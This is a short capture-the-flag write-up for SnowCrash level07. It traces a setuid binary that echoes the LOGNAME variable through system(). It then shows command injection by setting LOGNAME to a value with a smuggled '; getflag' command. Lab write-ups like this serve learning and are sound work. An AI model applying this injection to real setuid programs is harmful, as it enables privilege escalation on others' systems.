▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌   ▐▓▌

exploit: env substitution?

=======
file ./level07 
./level07: setuid setgid ELF 32-bit LSB executable
strings ./level07
LOGNAME
/bin/echo %s 

ltrace ./level07
getenv("LOGNAME")                                               = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07

Ok now we know for sure that this program getenv("LOGNAME") and then echoes the value. Let's see what we can do:

export LOGNAME='this will be printed; echo "bonjour"'
level07@SnowCrash:~$ ./level07 
this will be printed
bonjour

ok so we can clearly inject commands.
export LOGNAME='this will be printed; getflag'

it works, we get the flag.
